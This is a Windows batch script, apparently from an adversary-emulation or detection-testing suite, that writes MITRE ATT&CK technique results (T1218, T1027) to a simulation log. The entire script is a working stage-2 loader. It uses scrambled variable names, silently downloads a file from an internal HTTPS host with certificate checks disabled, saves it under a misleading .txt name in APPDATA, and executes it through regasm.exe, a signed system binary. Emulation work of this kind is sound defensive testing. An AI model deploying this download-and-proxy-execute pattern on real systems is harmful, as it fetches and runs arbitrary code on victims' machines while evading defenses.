@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM --- Placeholder assignments (random variable names) ---
SET aBcDp=%APPDATA%\10393\d3bcc907
SET xYzQw=f0a5cef2.txt
SET fDxWq=https://10.0.0.49/stage/2/icon.png?10393-7
SET pLkMn=ITZEL-S2BO
SET jUkLm=10393
SET vBnMc=7

REM --- Log file path ---
SET qWrTy=%APPDATA%\!vBnMc!\macula-simulations.log

REM --- Start debug logging ---
echo [!tsvar!][DEBUG][!pLkMn!][!jUkLm!]: heartbeat_start>> "!qWrTy!" 2>nul

REM Step 1: Heartbeat fetch (download Stage 2 Loader DLL)
curl -k -s -o "!aBcDp!\!xYzQw!" "!fDxWq!"

REM Log heartbeat completion
echo [!tsvar!][DEBUG][!pLkMn!][!jUkLm!]: heartbeat_complete>> "!qWrTy!" 2>nul

REM Step 2: Change working directory to output dir
echo [!tsvar!][DEBUG][!pLkMn!][!jUkLm!]: chdir_start>> "!qWrTy!" 2>nul
cd /d "!aBcDp!" >nul 2>&1
echo [!tsvar!][DEBUG][!pLkMn!][!jUkLm!]: chdir_result=!ERRORLEVEL!>> "!qWrTy!" 2>nul

REM Step 3: Execute regasm /U on the DLL
echo [!tsvar!][DEBUG][!pLkMn!][!jUkLm!]: regasm_start>> "!qWrTy!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U "!xYzQw!" >NUL 2>&1
set regasm_ec=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!pLkMn!][!jUkLm!]: regasm_result=!regasm_ec!>> "!qWrTy!" 2>nul

REM --- TTP Logging ---
REM T1218: System Binary Proxy Execution
if !regasm_ec!==0 (
  echo [!tsvar!][TTP][!pLkMn!][!jUkLm!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!qWrTy!" 2>nul
) else (
  echo [!tsvar!][TTP][!pLkMn!][!jUkLm!]: T1218^|System Binary Proxy Execution=[FAIL]:[regasm_failed]>> "!qWrTy!" 2>nul
)

REM T1027: Obfuscated Files or Information (script-level obfuscation applied)
echo [!tsvar!][TTP][!pLkMn!][!jUkLm!]: T1027^|Obfuscated Files or Information=[OK]:[]>> "!qWrTy!" 2>nul

REM Exit cleanly
exit /b 0